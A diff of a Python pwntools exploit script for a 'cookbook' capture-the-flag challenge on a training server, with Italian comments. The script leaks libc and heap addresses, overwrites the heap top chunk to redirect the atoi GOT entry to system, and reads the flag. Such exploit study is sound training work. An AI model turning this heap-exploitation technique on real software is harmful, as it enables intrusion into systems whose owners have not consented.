@@ -1,10 +1,9 @@
 from pwn import *
-import time
 
-#context.terminal = ['tmux', 'splitw', '-h']
-#p = process("./cookbook")
 p = remote("training.jinblack.it", 2017)
-#gdb.attach(p, '''b *0x08048bbc c''')
+#p = process("./cookbook")
+#context.terminal = ['tmux', 'splitw', '-h']
+#gdb.attach(p, '''	b *0x08049471	b *0x08048bbc c''')
 #context.log_level = 'debug'
 
 #f = elf.ELF('./cookbook')
@@ -30,7 +29,7 @@ def giveCookBookName(dimHex, name):
 	p.sendline("g")
 	time.sleep(0.2)
 	p.recvuntil(": ")
-	p.sendline(str(dimHex))
+	p.sendline(hex(dimHex))
 	time.sleep(0.2)
 	p.sendline(name)
 	time.sleep(0.2)
@@ -47,7 +46,7 @@ def newRecipe():
 	time.sleep(0.2)
 
 def addIngredient():
-	p.recvuntil("[q]uit\n")
+	p.recvuntil("[q]uit")
 	p.sendline("a")
 	time.sleep(0.2)
 	p.recvuntil("which ingredient to add? ")
@@ -113,14 +112,15 @@ print "LIBC_BASE: %#x" % libc_base
 print "SYSTEM: %#x" % systemAddr
 
 #PER LEAK HEAP
-payload = "A"*900 + p64(0x0804d098)
+recipe_bss = 0x00804d0ac - 8
+payload = "A"*900 + p64(recipe_bss) + "\x00\x00\x00\x00\x00\x00"
 giveRecipeName(payload)
 printCurrentRecipe()
 p.recvuntil("- ")
 leak2 = u32(p.recv(4)) #leak heap
 print "LEAK2: %#x" % leak2
-heap_base = leak2 - 0x1450
-topChunkAddr = heap_base + 0x1858
+heap_base = leak2 - 0x160
+topChunkAddr = heap_base + 0x1878
 print "HEAP_BASE: %#x" % heap_base
 print "TOP_CHUNK: %#x" % topChunkAddr
 
@@ -130,16 +130,19 @@ giveRecipeName(payload)
 
 exitFromRecipe()
 
-to_malloc = atoiGot - topChunkAddr + 0x1cd8 + 28
+to_malloc = atoiGot - topChunkAddr - 20
 giveCookBookName(to_malloc, "\x00")
-time.sleep(0.1)
-payload = p32(setvbufAddr)+p32(systemAddr)+p32(callocAddr)
-giveCookBookName(0xd, payload)
-time.sleep(0.1)
+to_send = p32(setvbufAddr) + p32(systemAddr) + p32(callocAddr)
+giveCookBookName(14, to_send)
 
 #addIngredientInital()
 #newIngredient()
-#setPrice("ls")
+#setPrice("cat flag")
+
+#poi alla fine si apre il menu e bisogna fare
+# - a -> per andare nel menu add ingredient
+# - n -> per creare un nuovo ingrediente
+# - p -> per entrare nel set price, e "cat flag" per sfruttare l'atoi a cui e stata sostituita la system
 
 
 p.interactive()
